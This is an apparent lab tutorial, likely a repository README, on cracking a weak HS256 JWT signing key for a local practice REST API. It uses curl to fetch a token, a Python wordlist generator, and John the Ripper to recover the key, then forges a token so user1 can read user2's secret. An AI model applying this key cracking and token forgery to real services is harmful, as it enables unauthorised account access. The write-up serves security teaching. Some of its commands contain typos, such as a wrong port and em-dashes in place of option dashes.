# Hacking JWT Tokens: By Bruteforcing Weak Signing Key

This is the way of hacking JWT tokens signed using weak keys. We will be using John The Ripper for determining the correct signing key!

### JWT tokens
#### Introduction
> JSON Web Token (JWT) is an open standard that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret with the [HMAC algorithm](https://www.geeksforgeeks.org/hmac-algorithm-in-computer-network/).

JWT Tokens consist of three parts seperated by dots (`.`), which are:
- Header
- Payload
- Signature

JWT Token typically looks like: `aaaa.bbbb.cccc`
> ![encoded-jwt3](https://user-images.githubusercontent.com/76884959/196450773-c13f06b8-5fff-4c46-a5c2-3ed9edabc093.png)

Breaking down the different parts:
> <img src="https://user-images.githubusercontent.com/76884959/196449704-fb0fc5ba-6b1f-4414-89ce-50c908f347f7.png" width="500" />

#### How it works?
- The whole process is called **signing the JWT token**. The signing algorithm takes the header, the payload, and the secret to create a unique signature.
> ![bOHqZ](https://user-images.githubusercontent.com/76884959/196461005-f53cad09-472c-4fa9-b11a-e76857ec5689.png)

- Next step is the verification of the token, once the JWT is received, the verification will take its header and payload, and together with the secret that is still saved on the server, basically create a test signature. But the original signature that was generated when the JWT was first created is still in the token, right? And that's the key to this verification. Because now all we have to do is to compare the test signature with the original signature. And if the test signature is the same as the original signature, then it means that the payload and the header have not been modified.
> ![b2dzI](https://user-images.githubusercontent.com/76884959/196462855-a856240c-56eb-4b41-8d5f-5b8636a21736.png)

### Initial Scenario
The scenario consists of a REST API running on a target machine and uses JWT-based authorization.
> **Note**: The signing key used for token generation is weak and the REST API is present in the repo itself.

### Implementation
#### Step 1:
Check the presence oh the REST API. <br/>
**Command**: `curl 127.0.0.1:500`

<img src="https://user-images.githubusercontent.com/76884959/196610094-e1dac5fd-441b-484b-a010-1eb5fa9f4eec.png" width="600" />

#### Step 2:
Getting the JWt Token for the user with username `user1`. <br/>
**Command**: `curl --location --request GET 'http://127.0.0.1:5000/login' \
--header 'Authorization: Basic dXNlcjE6ODk4OQ==' \
--data-raw ''`

<img src="https://user-images.githubusercontent.com/76884959/196610338-e1687f73-4974-4e0b-bedf-fc36ededa24e.png" width="600" />

The response contains the JWT Token for the user.

#### Step 3:
Decoding the token header and payload parts using https://jwt.io.
<img src="https://user-images.githubusercontent.com/76884959/196611018-98564f27-161e-47b1-be41-ca070cb9b340.png" width="600" />

The token uses HS256 algorithm (a symmetric signing key algorithm).

Since it is mentioned in the challenge description that a weak secret key has been used to sign the token and the constraints on the key are also specified, a bruteforce attack could be used to disclose the correct secret key.

#### Step 4:
We'll be using John The Ripper (jtr) for performing the bruteforce attack. For installing jtr follow the give command: `sudo apt-get install john -y` or `sudo snap install john-the-ripper`

To check if it is installed type `john` in the terminal.

<img src="https://user-images.githubusercontent.com/76884959/196611821-f6f05e27-fc56-4b16-bbcf-d5ee2c4d2f8c.png" width="600" />

#### Step 5:
Save the JWT Token obtained in Step 2 into a file called `jwt.txt`.

#### Step 6:
Generate a wordlist used for brute-forcing the signing-key:
Save the following Python script as `generate-wordlist.py`:
```
fp = open("wordlist.txt", "w")

for i in range (10):
  for j in range (10):
    for k in range (10):
      for l in range (10):
        fp.write(str(i) + str(j) + str(k) + str(l) + "\n");

fp.close()
```

Run the above python script to generate the wordlist.
**Command**: `python3 generate-wordlist.py`

#### Step 7:
The final step is to burte-force the signing key:
**Command**: `john jwt.txt — wordlist=wordlist.txt — format=HMAC-SHA256`

<img src="https://user-images.githubusercontent.com/76884959/196613036-990d3989-74fb-4c06-8586-a3107e86d6e4.png" width="600" />

#### Step 8:
Since the secret key for signing the token is known, it can be used to create a valid token. Use https://jwt.io to create a new token. Over here we change the username of the user in order to obtain a new token which can only be used by `user2` and not `user1`. Since the signing key is already known, the username of the user could be changed and the corresponding token would be generated.

<img src="https://user-images.githubusercontent.com/76884959/196614220-35db0341-788a-43e8-8bdb-fe885386ebfa.png" width="600" />

Now this forged token will allow `user1` to access the secrets which were only allowed to `user2`.

`user1` is authenticated and the user is able to see the secret namely, `password1` for the token generated with the username-`user1`
> <img src="https://user-images.githubusercontent.com/76884959/196614923-94b2cc63-ad0e-42a9-b13d-c6274794fdc0.png" width="800" />

Now, as the new token is forged, `user1` has the token corresponding to `user2`. which enables `user1` to get an acess to `user2`'s secret.
> <img src="https://user-images.githubusercontent.com/76884959/196615470-3719f817-7e51-495c-b291-67061c1d6f10.png" width="800" />

